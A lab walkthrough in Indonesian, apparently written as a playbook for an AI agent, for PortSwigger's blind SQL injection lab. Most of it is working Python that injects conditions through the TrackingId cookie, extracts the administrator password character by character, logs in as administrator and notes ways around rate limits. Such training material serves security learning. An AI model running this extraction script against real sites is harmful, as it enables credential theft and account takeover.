# Blind SQLi — Boolean-Based Enumeration (PortSwigger lab pattern)

Lab: *Blind SQL injection with conditional responses*.
Orakel: respons berisi "Welcome back" saat kondisi TRUE, tidak saat FALSE.
Injeksi via cookie `TrackingId` (bukan parameter query).

## Setup orakel (verify dulu sebelum enumerasi)

```python
import requests
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
lab = "<instance>.web-security-academy.net"

# Ambil cookie TrackingId + session SEKALI, pakai terus (jangan refresh di tengah)
r0 = s.get(f"{lab}/", timeout=15)
tracking = r0.cookies.get("TrackingId")
session  = r0.cookies.get("session")

def probe(condition):
    """Return True jika 'Welcome back' muncul utk kondisi SQL."""
    cookie_val = f"{tracking}' AND {condition}--"
    headers = {"User-Agent": "Mozilla/5.0",
               "Cookie": f"TrackingId={cookie_val}; session={session}"}
    r = requests.get(f"{lab}/", headers=headers, timeout=15)
    return "Welcome back" in r.text

# Biasanya: payload perlu dikirim via Cookie header manual (requests Session
# set_cookie gagal mempertahankan nilai injeksi di lab ini).
assert probe("'1'='1") is True
assert probe("'1'='2") is False
```

## Konfirmasi target

```python
# users table ada + administrator ada
probe("(SELECT 'a' FROM users LIMIT 1)='a'")              # True
probe("(SELECT 'a' FROM users WHERE username='administrator')='a'")  # True

# Panjang password
n = 0
for i in range(1, 51):
    if probe(f"(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a'"):
        n = i
    else:
        break
# password length = n + 1  (biasanya 20 di PortSwigger)
```

## Enumerasi per karakter — WAJIB background + checkpoint

- ~1.5s per probe; 20 char x 36 alphabet (a-z0-9) = 10-15 menit.
- **Jangan** jalankan dalam `execute_code` blocking (kernel 300s timeout membunuh).
- Tulis script ke file, jalankan `terminal(background=true)`, checkpoint file
  per karakter, resume dari offset.

```python
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
password = Path(CHECKPOINT).read_text().strip() if exists else ""

for pos in range(len(password)+1, 21):
    found = None
    for ch in ALPHABET:
        cond = (f"(SELECT SUBSTRING(password,{pos},1) FROM users "
                f"WHERE username='administrator')='{ch}'")
        if probe(cond):
            found = ch; break
    password += found or "?"
    Path(CHECKPOINT).write_text(password)   # checkpoint tiap char
```

Resume: `for pos in range(len(password)+1, 21)` — cukup re-run script, ia
lanjut dari posisi terakhir yang tersimpan.

## Setelah password lengkap

Login admin: GET `/login` → ambil `name="csrf" value="..."` → POST `/login`
dengan `csrf, username=administrator, password=<hasil>`. SOLVED jika
`"congratulations" in html.lower()`.

## Pitfall

1. Cookie `TrackingId` berubah tiap request normal — jangan re-fetch root di
   tengah enumerasi; ambil sekali dan reuse `tracking` + `session`.
2. Kalau `requests.Session().cookies.set()` tampaknya tidak bekerja untuk
   injeksi, pakai header `Cookie` manual (pola di atas).
3. Substring vs SUBSTR: PostgreSQL/Oracle pakai `SUBSTRING(...,pos,1)`;
   MySQL juga mendukung. Kalau lab pakai backend lain, sesuaikan.
4. Rate: tambah `time.sleep(0.2-0.5)` antar probe kalau kena rate-limit
   (PortSwigger toleran, tapi jangan brutal).